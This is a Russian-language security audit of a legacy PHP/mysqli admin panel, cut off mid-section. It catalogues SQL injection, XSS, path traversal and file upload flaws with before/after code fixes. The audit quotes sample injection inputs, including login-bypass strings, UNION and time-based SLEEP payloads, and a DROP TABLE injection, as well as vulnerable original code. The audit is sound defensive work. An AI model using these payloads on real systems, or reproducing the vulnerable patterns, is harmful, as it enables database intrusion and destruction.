\# Аудит безопасности legacy-админки (PHP / mysqli) - Этап 1



\[Новые хелперы](#Новые хелперы)



\*\*Область этапа 1:\*\* (1) все места, где `$\_GET` / `$\_POST` / `$\_REQUEST` / `$\_FILES` / `$\_SERVER` / `$\_SESSION` попадают в SQL и в другие места (JS, HTML, пути файлов, `include`) без проверки; (2) полная защита от SQL-инъекций на `mysqli`.

\*\*Без сильного рефакторинга:\*\* структура файлов, классы и сигнатуры сохранены. Добавлены только хелперы в `php/functions.php` и несколько приватных методов в `ObjectTable`.



Проверено файл за файлом: 17 файлов (раздел 4). Остальные найденные проблемы, не относящиеся к этапу 1, вынесены в раздел 5 \*\*без правок\*\*.



\## 0. Принципы исправления



| Проблема | Решение |

|---|---|

| Значения (логин, поля формы, id, фильтры) склеиваются в SQL | Подготовленные запросы: `db\_prepared($sql, \[$params])` (`mysqli::prepare` + `bind\_param`) |

| Имена таблиц/колонок, `ORDER BY` нельзя передать плейсхолдером | Белый список (`ObjectTable::TABLES`, колонки из `colArray`) + `db\_ident()` (`^\[A-Za-z0-9\_]{1,64}$` и обратные кавычки) |

| Числа из `$\_SESSION`/`$\_GET` идут в SQL и JS | Приведение к `int` / `filter\_var(FILTER\_VALIDATE\_INT)` |

| Значения из сессии/БД вставляются в JS внутри `<script>` | `js\_str()` (`json\_encode` с `JSON\_HEX\_TAG\\|AMP\\|APOS\\|QUOT`) |

| Значения вставляются в HTML | `html\_esc()` / `htmlspecialchars` |

| Данные пользователя в пути файла / `include` | Белые списки, regex, `ctype\_digit` |



\---



\## 1. Сводная таблица



Severity: \*\*Critical\*\* - удалённое выполнение/полный обход защиты/чтение-запись БД; \*\*High\*\* - серьёзное, эксплуатируется легко; \*\*Medium\*\* - ограниченный эффект или нужны условия; \*\*Low\*\* - укрепление.



\### 1.1 SQL-инъекции



| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |

|---|---|---|---|---|---|

| S-01 | `functions.admin.php` `user\_auth()` | Critical | `NL\_USER\_LOGIN = '" . $login . "'` | `NL\_USER\_LOGIN = ?`, `aes\_encrypt(?, ?)`, `db\_prepared()` | Обход входа (`' OR 1=1 --`), выгрузка данных через UNION |

| S-02 | `ObjectTable::\_\_construct`, `jqgrid.show/edit/table.php` | Critical | `$tblName = $\_GET\["tblName"]` -> `FROM " . $this->dbName` | `ObjectTable::TABLES` + `isAllowedTable()`, `db\_ident()` | Чтение/запись произвольной таблицы, SQLi в имени таблицы |

| S-03 | `showData()` фильтры | Critical | `"$search\_field = $value"`, `LIKE '%" . $value . "%'`, имя поля из ключа `$\_GET` | `buildSearchWhere()`: поле из белого списка колонок, значение через `?` | SQLi через значения и имена полей фильтра |

| S-04 | `getData()` `ORDER BY` | Critical | `" ORDER BY " . $sidx . " " . $sord` | `getSafeOrderBy()`: колонка из белого списка, `ASC/DESC` | SQLi в `ORDER BY` (subquery, time-based) |

| S-05 | `showData()/getData()` `LIMIT` | High | `"LIMIT " . $limit \* ($page - 1) . ", " . $limit` | `(int)`, границы 1..1000, `LIMIT ?, ?` | SQLi/DoS через `page`, `rows` |

| S-06 | `saveData()` выбор/UPDATE/DELETE по `$id` | Critical | `"... WHERE ID\_" . $this->dbName . " = " . $id` | `FILTER\_VALIDATE\_INT` + `= ?` | SQLi (даже без кавычек), массовое удаление/правка |

| S-07 | `saveData()` значения полей в INSERT/UPDATE | Critical | `"'" . $post\[...] . "'"`, `array\_push($values, $post\[...])` для чисел, `AES\_ENCRYPT('...','" . AESKEY . "')` | `prepareValue()` (проверка типа) + `?` / `AES\_ENCRYPT(?, ?)` | SQLi через любое поле формы, включая числовые (без кавычек) |

| S-08 | `saveData()` `$oper` в лог | Critical | `VALUES(..., '" . $oper . "', ...)` | `in\_array($oper, \["add","edit","del"], true)` + `?` | SQLi через `oper`, выполнение пустого/произвольного запроса |

| S-09 | `saveData()` лог изменений (`NL\_LOG\_DETAIL`) | High | `"'" . $row\_cur\[...] . "'"`, `"'" . $post\[...] . "'"` | `VALUES (?, ?, ?, ?)` | SQLi 2-го порядка (payload из БД срабатывает в логе) |

| S-10 | `saveData()` IP из заголовков | Medium | `'" . $user\_ip . "'` (`X-Forwarded-For`, `Client-IP`...) | `FILTER\_VALIDATE\_IP` + `?`; `split()` -> `explode()` | SQLi через заголовок; фатальная ошибка `split()` в PHP 7+ |

| S-11 | `getTableWhere()` (сессия в SQL) | Medium | `"(2 = " . $\_SESSION\["ID\_NL\_USER\_PERMISSION"] . ")"` | `(int)($\_SESSION\[...] ?? 0)` | SQLi 2-го порядка через значения сессии |

| S-12 | `set\_id.php` | Critical | `TABLE\_NAME = '" . $tbl . "'`, `ALTER TABLE " . $tbl` | `ObjectTable::isAllowedTable()`, `?`, `db\_ident()`, `$\_POST` вместо `$\_REQUEST` | SQLi и инъекция в DDL (`ALTER`) |

| S-13 | `select.get.php` | Critical | `"SELECT \* FROM " . $tblChild . " WHERE ID\_" . $tblParent . " = " . $idParent` | белый список таблиц, `db\_ident()`, `FILTER\_VALIDATE\_INT`, `= ?` | SQLi + чтение любой таблицы |

| S-14 | `getData()` `AES\_DECRYPT`, `get\_query\_left\_joins()`, выбор справочников | Low | `AES\_DECRYPT(" . $col->dbName . ",'" . AESKEY . "')`, `" LEFT JOIN " . $lj` | ``AES\_DECRYPT(tbl.`col`, ?)``, `db\_ident()` | Укрепление: ключ не в тексте SQL, идентификаторы проверяются |

| S-15 | `db\_error()` и `echo $query;` | High | `return "...Ошибка в запросе:<br />" . $query`, `echo $query;` | generic-сообщение + `error\_log`; `echo` удалён | Раскрытие структуры БД и отражённый XSS через текст запроса |



\### 1.2 Данные из запроса/сессии в другие места



| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |

|---|---|---|---|---|---|

| I-01 | `functions.admin.php` верх, `includeAdminPartsByLvl()` | High | `$page` из `REQUEST\_URI` -> `include ".../parts/" . $page . ".php"` | `preg\_match('/^\[A-Za-z0-9\_-]+$/')` | Path traversal / LFI в `include` |

| I-02 | `index.php` | Medium | `<?= $page ?>` в `class="..."` | `html\_esc($page)` + валидация `$page` | Отражённый XSS через URL |

| I-03 | `parts/main.php` | Medium | `<?= $\_SESSION\["NL\_USER\_SHORT"] ?>` | `htmlspecialchars(...)` | Сохранённый XSS через имя пользователя |

| I-04 | `getjqGridCustom()` | High | `!= "' . $\_SESSION\["NL\_USER\_SHORT"] . '"` в `<script>` | `js\_str($\_SESSION\["NL\_USER\_SHORT"] ?? "")` | Внедрение JS / XSS (имя редактируется любым сотрудником) |

| I-05 | `renderTable()` `defaultValue` | High | `'defaultValue : "' . $col->defValue . '"'` (телефон из сессии) | `js\_str($col->defValue)` | Внедрение JS через телефон |

| I-06 | `getMainTableCol()`, `renderTable()` | Low | `defValue = $\_SESSION\["ID\_NL\_USER"]`, `== ' . $\_SESSION\["ID\_NL\_USER"] . ')` в JS | `(int)(...)` | Нечисловое значение сессии в JS |

| I-07 | `renderTable()` значения `select` | High | `mb\_ereg\_replace('"', '\\\\"', $row\[...])` (экранируется только `"`) | `js\_str($selectOptions)` | Внедрение JS через элемент справочника (`\\`, `</script>`) |

| I-08 | `onlymy.php` | Low | `$\_SESSION\["onlymy"] = $\_POST\["onlymy"];` | только `"1"` / `"0"` | Произвольные данные в сессии |

| I-09 | `file.upload.php` путь | Critical | `$tbl/$col/$id = $\_REQUEST\[...]` -> `"/img/" . $dir . "/" . $col . "\_" . $id`; `mb\_ereg\_replace($tbl . "\_", ...)` | белый список таблицы и колонки, `ctype\_digit($id)` | Path traversal (запись файла вне `/img`), regex-инъекция |

| I-10 | `file.upload.php` расширение | High | чёрный список `.php .phtml .php3 .php4 .php5` | белый список `jpg/jpeg/png/gif/webp` + `getimagesize` | Загрузка `.phar/.php7/.pht/.phps` и т.п. -> RCE |

| I-11 | `saveData()` очистка фото | High | `glob(... $trueId ...)` где `$trueId = $values\[0]` из `$\_POST`, затем `unlink` | `$trueId` = валидированное целое | Удаление чужих `.jpg` (`\*`, `../`) |

| I-12 | `showData()` XML | Medium | `"<page>" . $page`, `<row id="` . $data\[$i]\[0], `CDATA\[` . $data . `]]>` | `(int)`, `htmlspecialchars(ENT\_XML1)`, разрыв `]]>` | Инъекция в XML-ответ |

| I-13 | `select.get.php` вывод | Medium | `'<option value="' . $row\[...] . '">' . $row\[...]` | `html\_esc()` | Сохранённый XSS через справочники |

| I-14 | `renderTable()` шаблон | Low | `mb\_ereg\_replace("{colModel}", $colModel, ...)` | `str\_replace(...)` | Regex/`\\0` обратные ссылки в подстановке данных |

| I-15 | `db\_connect()` | Low | `printf("Ошибка подключения к базе: %s", $mysqli->connect\_error)` | `error\_log` + generic | Раскрытие хоста/пользователя БД |



\---



\## 2. Новые хелперы (`php/functions.php`)



```php

// Подготовленный запрос: данные ТОЛЬКО через $params

function db\_prepared($query, array $params = array()) {

&#x20;   global $mysqli;

&#x20;   try {

&#x20;       $stmt = $mysqli->prepare($query);

&#x20;       if ($stmt === false) { error\_log("DB prepare error: " . $mysqli->error . " | " . $query); return false; }

&#x20;       if (count($params) > 0) {

&#x20;           $types = ""; $values = array();

&#x20;           foreach (array\_values($params) as $p) {

&#x20;               if (is\_bool($p)) { $p = (int)$p; }

&#x20;               if (is\_int($p))        { $types .= "i"; }

&#x20;               elseif (is\_float($p))  { $types .= "d"; }

&#x20;               else { $types .= "s"; $p = ($p === null) ? null : (string)$p; }

&#x20;               $values\[] = $p;

&#x20;           }

&#x20;           $stmt->bind\_param($types, ...$values);

&#x20;       }

&#x20;       if (!$stmt->execute()) { error\_log("DB execute error: " . $stmt->error . " | " . $query); $stmt->close(); return false; }

&#x20;       $result = $stmt->get\_result();          // false для INSERT/UPDATE/DELETE

&#x20;       $stmt->close();

&#x20;       return ($result === false) ? true : $result;

&#x20;   } catch (mysqli\_sql\_exception $e) { error\_log("DB prepared error: " . $e->getMessage() . " | " . $query); return false; }

}



// Идентификаторы (имена таблиц/колонок) плейсхолдером не передать

function db\_ident($name) {

&#x20;   if (!is\_string($name) || !preg\_match('/^\[A-Za-z0-9\_]{1,64}$/', $name)) {

&#x20;       error\_log("DB bad identifier"); http\_response\_code(400); exit("Bad request");

&#x20;   }

&#x20;   return "`" . $name . "`";

}



function db\_like($value) { return "%" . addcslashes((string)$value, "\\\\%\_") . "%"; }

function html\_esc($value) { return htmlspecialchars((string)$value, ENT\_QUOTES | ENT\_SUBSTITUTE, "UTF-8"); }

function js\_str($value) {

&#x20;   $json = json\_encode((string)$value, JSON\_HEX\_TAG | JSON\_HEX\_AMP | JSON\_HEX\_APOS | JSON\_HEX\_QUOT | JSON\_UNESCAPED\_UNICODE | JSON\_INVALID\_UTF8\_SUBSTITUTE);

&#x20;   return ($json === false) ? '""' : $json;

}

```



`db\_query()` оставлен только для запросов без переменных; в него добавлен перехват `mysqli\_sql\_exception` (в PHP 8.1+ mysqli по умолчанию бросает исключения, и шаблон `db\_query(...) or die(...)` перестаёт работать).



\---



\## 3. Подробные исправления



\### S-01 - `user\_auth()` (`functions.admin.php`), Critical

\*\*Причина:\*\* логин и пароль из `$\_POST` конкатенируются в SQL. `admin' -- ` в логине полностью отключает проверку пароля. Также в функцию может прийти не строка (`login\[]=...`).



\*\*Было:\*\*

```php

$query = "SELECT \* FROM NL\_USER au WHERE ((au.NL\_USER\_LOGIN = '" . $login . "') AND au.NL\_USER\_PASSWORD = aes\_encrypt('" . $pass . "','" . AESKEY . "'))";

$res = db\_query($query) or die(db\_error($query));

if (db\_num\_rows($res) > 0) {

&#x20;   $row = db\_fetch\_assoc($res);

&#x20;   $\_SESSION\["ID\_NL\_USER"] = $row\["ID\_NL\_USER"];

&#x20;   ...

&#x20;   $\_SESSION\["ID\_NL\_USER\_PERMISSION"] = $row\["ID\_NL\_USER\_PERMISSION"];

```

\*\*Стало:\*\*

```php

if (!is\_string($login) || !is\_string($pass) || ($login === "") || (strlen($login) > 50) || (strlen($pass) > 255)) {

&#x20;   return false;

}

$query = "SELECT \* FROM NL\_USER au WHERE ((au.NL\_USER\_LOGIN = ?) AND au.NL\_USER\_PASSWORD = aes\_encrypt(?, ?))";

$res = db\_prepared($query, array($login, $pass, AESKEY)) or die(db\_error($query));

if (db\_num\_rows($res) > 0) {

&#x20;   $row = db\_fetch\_assoc($res);

&#x20;   session\_regenerate\_id(true);                       // защита от фиксации сессии

&#x20;   $\_SESSION\["ID\_NL\_USER"] = (int)$row\["ID\_NL\_USER"]; // числа из сессии дальше идут в SQL и JS

&#x20;   ...

&#x20;   $\_SESSION\["ID\_NL\_USER\_PERMISSION"] = (int)$row\["ID\_NL\_USER\_PERMISSION"];

```

\*\*Решает:\*\* обход авторизации и SQLi на входе; типизация данных сессии (закрывает S-11 для источника); `session\_regenerate\_id` - бонус к этапу 2.



\---



\### S-02 - имя таблицы из `$\_GET\["tblName"]`, Critical

\*\*Причина:\*\* `jqgrid.show.php`, `jqgrid.edit.php`, `jqgrid.table.php` создают `new ObjectTable($\_GET\["tblName"])`; имя идёт в `FROM`, `UPDATE`, `DELETE`, `INSERT`, `glob`, а также в JS/HTML шаблона (`{tableName}`). Плейсхолдером имя таблицы не передать, значит нужен белый список.



\*\*Было:\*\*

```php

// jqgrid.show.php (аналогично edit / table)

$tblName = $\_GET\["tblName"];

$table = new ObjectTable($tblName);



// ObjectTable

function \_\_construct($tableName) {

&#x20;   $this->dbName = $tableName;

```

\*\*Стало:\*\*

```php

// jqgrid.show.php

$tblName = $\_GET\["tblName"] ?? "";

$table = new ObjectTable($tblName); // проверка по белому списку в конструкторе



// ObjectTable

const TABLES = \["NL\_VIEW", "NL\_HOUSES", "NL\_MATERIAL", "NL\_USER", "NL\_PROP\_RESALE"];

public static function isAllowedTable($tableName) {

&#x20;   return is\_string($tableName) \&\& in\_array($tableName, self::TABLES, true);

}

function \_\_construct($tableName) {

&#x20;   if (!self::isAllowedTable($tableName)) { http\_response\_code(400); exit("Bad request"); }

&#x20;   $this->dbName = $tableName;

```

\*\*Решает:\*\* SQLi, XSS/JS-инъекцию через `{tableName}`, чтение и запись в произвольные таблицы (`NL\_LOG`, служебные). Проверка в конструкторе закрывает сразу все три endpoint-а и будущие вызовы. Список совпадает с таблицами, описанными в `getTableColArray()`.



\---



\### S-03 - фильтры поиска в `showData()`, Critical

\*\*Причина:\*\* каждый параметр `$\_GET`, в имени которого есть `NL\_`, превращается в условие: и \*\*имя поля\*\*, и \*\*значение\*\* подставляются в SQL. Для числовых колонок значение идёт вообще без кавычек: `NL\_PROP\_RESALE\_FLOOR=1 OR 1=1`, `...\_COST\_TOTAL\_from=0 UNION SELECT ...`.



\*\*Было:\*\*

```php

foreach ($\_GET as $key => $value) {

&#x20;   if (strpos($key, "NL\_") !== false) {

&#x20;       $search\_field = $key;

&#x20;       if (strpos($key, "ID\_") === 0) { $search\_field = substr($key, 3) . "\_SHORT"; }

&#x20;       if (strpos($key, "\_from") !== false) {

&#x20;           $search\_field = str\_replace("\_from", "", $search\_field);

&#x20;           $search\_value = "$search\_field >= " . $value;

&#x20;       } elseif (strpos($key, "\_to") !== false) {

&#x20;           $search\_value = "$search\_field <= " . $value;

&#x20;       } else {

&#x20;           $search\_value = "$search\_field = $value";

&#x20;           ...LIKE '%" . $value . "%'

&#x20;       }

&#x20;       $search\_where .= " AND ($search\_value)";

```

\*\*Стало:\*\*

```php

list($search\_where, $search\_params) = $this->buildSearchWhere($\_GET);

...

private function buildSearchWhere($source) {

&#x20;   $where = "(1=1)"; $params = Array();

&#x20;   $columns = Array();                                    // только колонки таблицы, кроме пароля

&#x20;   foreach ($this->getOwnColumns() as $col) {

&#x20;       if ($col->type != "encrypted") { $columns\[$col->dbName] = $col; }

&#x20;   }

&#x20;   foreach ($source as $key => $value) {

&#x20;       if (!is\_string($key) || !is\_string($value) || ($value === "") || (strpos($key, "NL\_") === false)) continue;

&#x20;       $operator = "="; $baseKey = $key;

&#x20;       if (preg\_match('/^(.+)\_(from|to)$/', $key, $m)) { $baseKey = $m\[1]; $operator = ($m\[2] == "from") ? ">=" : "<="; }

&#x20;       if (!isset($columns\[$baseKey])) continue;          // неизвестные параметры игнорируются

&#x20;       $col = $columns\[$baseKey];

&#x20;       $field = ($col->type == "select") ? db\_ident(substr($col->dbName, 3) . "\_SHORT") : "tbl." . db\_ident($col->dbName);

&#x20;       if (($col->type == "integer") || ($col->type == "float")) {

&#x20;           if (!is\_numeric($value)) { $where .= " AND (1=0)"; continue; }

&#x20;           $params\[] = trim($value);                      $where .= " AND ($field $operator ?)";

&#x20;       } elseif ($operator == "=") {

&#x20;           $params\[] = db\_like($value);                   $where .= " AND ($field LIKE ?)";

&#x20;       } else {

&#x20;           $params\[] = $value;                            $where .= " AND ($field $operator ?)";

&#x20;       }

&#x20;   }

&#x20;   return array($where, $params);

}

```

\*\*Решает:\*\* SQLi через значения (включая числовые) и через \*\*имена\*\* полей. Дополнительно `%` и `\_` в `LIKE` экранируются, а колонка пароля недоступна для поиска (иначе по ней можно делать оракул). `COUNT(\*)` теперь учитывает `$this->where` (ограничения доступа), как и выборка.



\---



\### S-04 - `ORDER BY` (`sidx`, `sord`), Critical

\*\*Причина:\*\* `$\_GET\['sidx']` и `$\_GET\['sord']` конкатенируются в `ORDER BY`; там работают подзапросы и time-based инъекции (`sidx=(SELECT IF(...,SLEEP(5),1))`). Значения нельзя передать плейсхолдером.



\*\*Было:\*\*

```php

$sidx = $\_GET\['sidx'];

$sord = isset($\_GET\['sord']) ? $\_GET\['sord'] : "ASC";

...

$query .= " ORDER BY " . $sidx . " " . $sord;

```

\*\*Стало:\*\*

```php

$sidx = is\_string($\_GET\['sidx'] ?? null) ? $\_GET\['sidx'] : "";

$sord = is\_string($\_GET\['sord'] ?? null) ? $\_GET\['sord'] : "ASC";

...

$query .= " ORDER BY " . $this->getSafeOrderBy($sidx, $sord);



private function getSafeOrderBy($sidx, $sord) {

&#x20;   $column = "ID\_" . $this->dbName;                        // по умолчанию

&#x20;   if (is\_string($sidx)) {

&#x20;       foreach ($this->getOwnColumns() as $col) {

&#x20;           if (($col->dbName === $sidx) \&\& ($col->type != "encrypted")) { $column = $col->dbName; break; }

&#x20;       }

&#x20;   }

&#x20;   $direction = (strtoupper((string)$sord) === "DESC") ? "DESC" : "ASC";

&#x20;   return "tbl." . db\_ident($column) . " " . $direction;

}

```

\*\*Решает:\*\* SQLi в `ORDER BY`. Побочный эффект: префикс `tbl.` устраняет ошибку «Column ... is ambiguous» при сортировке по колонкам-справочникам с `JOIN`; пустой `sidx` больше не ломает запрос.



\---



\### S-05 - `LIMIT` (`page`, `rows`), High

\*\*Причина:\*\* `$\_GET\['page']` и `$\_GET\['rows']` идут в `LIMIT` и в XML как есть. `rows=1000000` - DoS, а `page`/`rows` - вектор инъекции.



\*\*Было:\*\*

```php

$page = $\_GET\['page'];   $limit = $\_GET\['rows'];

...

$query .= " LIMIT " . $limit \* ($page - 1) . ", " . $limit;

```

\*\*Стало:\*\*

```php

$page = (int)($\_GET\['page'] ?? 1);   if ($page < 1) { $page = 1; }

$limit = (int)($\_GET\['rows'] ?? 50); if ($limit < 1) { $limit = 50; } if ($limit > 1000) { $limit = 1000; }

...

$query .= " LIMIT ?, ?";

$params\[] = max(0, (int)$limit \* ((int)$page - 1));

$params\[] = max(0, (int)$limit);

```

\*\*Решает:\*\* инъекцию и DoS. Максимум 1000 соответствует `rowList` в `jqgrid.html`.



\---



\### S-06 / S-07 / S-08 / S-09 - `saveData()`, Critical

\*\*Причина:\*\* метод вызывается из `jqgrid.edit.php` со всем `$\_POST`. Из него в SQL склеиваются `$id`, `$oper`, значения полей (числовые без кавычек), старые значения из БД для лога, ключ AES.



\*\*Было (ключевые места):\*\*

```php

$query\_cur = "SELECT \* FROM " . $this->dbName . " WHERE ID\_" . $this->dbName . " = " . $id;

...

$query\_log = "INSERT INTO NL\_LOG(...) VALUES('" . date("Y.m.d") . "', '" . date("H:i:s") . "', '" . $user\_ip . "', '" . $oper . "', '" . $this->dbName . "', " . $\_SESSION\["ID\_NL\_USER"] . " )";

...

array\_push($values, "'" . $post\[$col->dbName] . "'");                         // строки

array\_push($values, "AES\_ENCRYPT('" . $post\[$col->dbName] . "','" . AESKEY . "')");

array\_push($values, $post\[$col->dbName]);                                     // числа - без кавычек!

...

$valold = "'" . $row\_cur\[$col->dbName] . "'";   $valnew = "'" . $post\[$col->dbName] . "'";

$query\_log\_detail = "INSERT INTO NL\_LOG\_DETAIL(...) VALUES (" . $row\_log\["ID\_LOG"] . ", " . $valold . "," . $valnew . ", '" . $col->dbName . "')";

...

$query = "UPDATE " . $this->dbName . " SET " . ... . $fields\[$i] . " = " . $values\[$i] ... " WHERE ID\_" . $this->dbName . " = " . $id;

echo $query;

```

\*\*Стало:\*\*

```php

// 1) операция и id - до любых запросов

if (!in\_array($oper, array("add", "edit", "del"), true) || !is\_array($post)) { http\_response\_code(400); die(); }

$id = filter\_var($id, FILTER\_VALIDATE\_INT, array("options" => array("min\_range" => 1)));

if (($id === false) \&\& ($oper != "add")) { http\_response\_code(400); die(); }



// 2) выбор текущей записи

$query\_cur = "SELECT \* FROM " . db\_ident($this->dbName) . " WHERE " . db\_ident("ID\_" . $this->dbName) . " = ?";

$res\_cur = db\_prepared($query\_cur, array($id)) or die(db\_error($query\_cur));



// 3) проверка и подготовка значений ДО записи в лог

$p = $this->prepareValue($col, $raw);       // false -> HTTP 400

private function prepareValue($col, $raw) {

&#x20;   if (($raw === null) || (trim($raw) === "")) { return array("?", array(null)); }

&#x20;   switch ($col->type) {

&#x20;       case "integer": case "select":

&#x20;           if (!preg\_match('/^\\s\*-?\\d{1,18}\\s\*$/', $raw)) { return false; }

&#x20;           return array("?", array((int)$raw));

&#x20;       case "float":

&#x20;           if (!is\_numeric($raw)) { return false; }

&#x20;           return array("?", array(trim($raw)));

&#x20;       case "encrypted": return array("AES\_ENCRYPT(?, ?)", array($raw, AESKEY));

&#x20;       default:          return array("?", array($raw));

&#x20;   }

}



// 4) лог

$query\_log = "INSERT INTO NL\_LOG(NL\_LOG\_DATE, NL\_LOG\_TIME, NL\_LOG\_IP, NL\_LOG\_IUD, NL\_LOG\_TABLE\_NAME, ID\_NL\_USER) VALUES(?, ?, ?, ?, ?, ?)";

db\_prepared($query\_log, array(date("Y.m.d"), date("H:i:s"), $user\_ip, $oper, $this->dbName, (int)($\_SESSION\["ID\_NL\_USER"] ?? 0))) or die(db\_error($query\_log));

$query\_log\_detail = "INSERT INTO NL\_LOG\_DETAIL(ID\_NL\_LOG, NL\_LOG\_DETAIL\_OLD, NL\_LOG\_DETAIL\_NEW, NL\_LOG\_DETAIL\_FIELD) VALUES (?, ?, ?, ?)";

db\_prepared($query\_log\_detail, array((int)$row\_log\["ID\_LOG"], $valold, $valnew, $col->dbName)) or die(db\_error($query\_log\_detail));



// 5) итоговый запрос

$query = "INSERT INTO " . $tbl . " (" . implode(",", array\_map("db\_ident", $fields)) . ") VALUES(" . implode(",", $placeholders) . ")";

$query = "UPDATE " . $tbl . " SET " . implode(",", $set) . " WHERE " . $tblId . " = ?";   // $set\[] = `col` = ? / AES\_ENCRYPT(?, ?)

$query = "DELETE FROM " . $tbl . " WHERE " . $tblId . " = ?";

db\_prepared($query, $query\_params) or die(db\_error($query));       // echo $query; удалён

```

\*\*Решает:\*\*

\- S-06: `id` - только положительное целое и плейсхолдер.

\- S-07: любые значения полей попадают в SQL только через плейсхолдеры; числовые колонки проверяются по типу (раньше `ID\_NL\_VIEW=1 OR 1=1` попадало в `VALUES`/`SET` без кавычек). Невалидное значение даёт HTTP 400 до записи в лог.

\- S-08: `oper` из белого списка; раньше неизвестное значение превращалось в пустой запрос `""`.

\- S-09: старые значения из БД больше не склеиваются в лог, что закрывает SQLi 2-го порядка (payload, сохранённый ранее, срабатывал при следующем редактировании).

\- S-15: клиенту больше не возвращается текст запроса.



\### S-10 - IP пользователя, Medium

\*\*Причина:\*\* при отсутствии `REMOTE\_ADDR` IP берётся из заголовков `HTTP\_X\_FORWARDED\_FOR`, `HTTP\_CLIENT\_IP`, `HTTP\_VIA` и др. (их задаёт клиент) и склеивается в SQL. Ветка `15 < strlen` вызывает `split()`, удалённую в PHP 7 (фатальная ошибка).



\*\*Было:\*\*

```php

$ar = split(', ', $user\_ip);

...

VALUES(... '" . $user\_ip . "' ...

```

\*\*Стало:\*\*

```php

$ar = explode(', ', $user\_ip);

...

if (filter\_var($user\_ip, FILTER\_VALIDATE\_IP) === false) { $user\_ip = 'unknown'; }   // + значение идёт через ?

```

\*\*Решает:\*\* инъекцию через заголовок и падение на длинных значениях.



\### S-11 - `$\_SESSION` в `WHERE` (`getTableWhere`), Medium

\*\*Причина:\*\* значения из сессии (взятые из БД) подставлялись в SQL как есть. Любая строка, попавшая в сессию, - SQLi 2-го порядка.



\*\*Было:\*\*

```php

return "(tbl.ID\_NL\_USER\_PERMISSION != 2) AND (2 = " . $\_SESSION\["ID\_NL\_USER\_PERMISSION"] . ")";

return "(tbl.ID\_NL\_USER = " . $\_SESSION\["ID\_NL\_USER"] . ")";

```

\*\*Стало:\*\*

```php

return "(tbl.ID\_NL\_USER\_PERMISSION != 2) AND (2 = " . (int)($\_SESSION\["ID\_NL\_USER\_PERMISSION"] ?? 0) . ")";

return "(tbl.ID\_NL\_USER = " . (int)($\_SESSION\["ID\_NL\_USER"] ?? 0) . ")";

```

\*\*Решает:\*\* в условие попадает только число. Условия без пользовательских строк оставлены литералами (int-cast достаточен), чтобы не менять структуру `$this->where`.



\### S-12 - `set\_id.php`, Critical

\*\*Причина:\*\* `$\_REQUEST\["table"]` (включает GET/POST/COOKIE) подставляется в запрос к `INFORMATION\_SCHEMA` \*\*и в DDL\*\* `ALTER TABLE`; DDL нельзя параметризовать, поэтому допустимо только имя из белого списка.



\*\*Было:\*\*

```php

$tbl = $\_REQUEST\["table"];

$query = "SELECT AUTO\_INCREMENT FROM INFORMATION\_SCHEMA.TABLES WHERE (TABLE\_SCHEMA = '" . DBNAME . "') AND (TABLE\_NAME = '" . $tbl . "')";

$query = "ALTER TABLE " . $tbl . " AUTO\_INCREMENT = " . ($id + 1);

```

\*\*Стало:\*\*

```php

$tbl = $\_POST\["table"] ?? "";

if (!ObjectTable::isAllowedTable($tbl)) { http\_response\_code(400); db\_disconnect(); exit("Bad request"); }

$query = "SELECT AUTO\_INCREMENT FROM INFORMATION\_SCHEMA.TABLES WHERE (TABLE\_SCHEMA = ?) AND (TABLE\_NAME = ?)";

$res = db\_prepared($query, array(DBNAME, $tbl));

$id = (int)($row\["AUTO\_INCREMENT"] ?? 0);

$query = "ALTER TABLE " . db\_ident($tbl) . " AUTO\_INCREMENT = " . ($id + 1);

```

\*\*Решает:\*\* SQLi и инъекцию в DDL (`x; DROP TABLE ...`, `ALTER` произвольной таблицы). JS (`defValue` в `getMainTableCol`) шлёт именно POST.



\### S-13 - `select.get.php`, Critical

\*\*Причина:\*\* три параметра `$\_POST` собираются в запрос, плюс значения БД печатаются в HTML без экранирования. Функции `db\_fetch\_array` нет в приложенном `functions.php` (вызов падает), поэтому используется `db\_fetch\_assoc`.



\*\*Было:\*\*

```php

$query = "SELECT \* FROM " . $tblChild . " WHERE ID\_" . $tblParent . " = " . $idParent;

$res = db\_query($query);

while ($row = db\_fetch\_array($res)) {

&#x20;   $options .= '<option value="' . $row\["ID\_" . $tblChild] . '">' . $row\[$tblChild . "\_SHORT"] . '</option>';

```

\*\*Стало:\*\*

```php

$idParent = filter\_var($\_POST\["idParent"] ?? null, FILTER\_VALIDATE\_INT);

$lookupTables = array\_merge(ObjectTable::TABLES, array("NL\_USER\_PERMISSION"));

if (!in\_array($tblParent, $lookupTables, true) || !in\_array($tblChild, $lookupTables, true) || ($idParent === false)) { http\_response\_code(400); db\_disconnect(); exit("Bad request"); }

$query = "SELECT \* FROM " . db\_ident($tblChild) . " WHERE " . db\_ident("ID\_" . $tblParent) . " = ?";

$res = db\_prepared($query, array($idParent));

...

$options .= '<option value="' . html\_esc($row\["ID\_" . $tblChild] ?? "") . '">' . html\_esc($row\[$tblChild . "\_SHORT"] ?? "") . '</option>';

```

\*\*Решает:\*\* SQLi, чтение произвольной таблицы, XSS в `<option>`.



\### S-14 - укрепление остальных идентификаторов, Low

Имена, формируемые из кода (`AES\_DECRYPT(col)`, `LEFT JOIN`, таблица справочника в `renderTable()`), не приходят от пользователя, но теперь тоже проходят через `db\_ident()`, а ключ AES передаётся как параметр.



\*\*Было:\*\*

```php

$query .= ", AES\_DECRYPT(" . $col->dbName . ",'" . AESKEY . "') AS " . $col->dbName . "\_DECRYPTED";

$leftJoin .= " LEFT JOIN " . $lj . " ON " . $lj . ".ID\_" . $lj . " = tbl.ID\_" . $lj;

$query = "SELECT \* FROM " . $selectTableName;

```

\*\*Стало:\*\*

```php

$query .= ", AES\_DECRYPT(tbl." . db\_ident($col->dbName) . ", ?) AS " . db\_ident($col->dbName . "\_DECRYPTED");   // $params\[] = AESKEY

$leftJoin .= " LEFT JOIN " . db\_ident($lj) . " ON " . db\_ident($lj) . "." . db\_ident("ID\_" . $lj) . " = tbl." . db\_ident("ID\_" . $lj);

$query = "SELECT \* FROM " . db\_ident($selectTableName);

```

\*\*Решает:\*\* защита в глубину: случайное изменение таблиц/колонок не превратится в инъекцию.



\### S-15 - `db\_error()`, `echo $query`, Medium-High

\*\*Причина:\*\* `die(db\_error($query))` печатает в браузер \*\*полный текст запроса\*\* со значениями пользователя: раскрытие структуры БД и отражённый XSS (значение из формы попадает в HTML).



\*\*Было:\*\*

```php

function db\_error($query) {

&#x20;   $q\_err = "<br /><br />Ошибка в запросе:<br />" . $query . "<br /><br />";

&#x20;   return $q\_err;

}

```

\*\*Стало:\*\*

```php

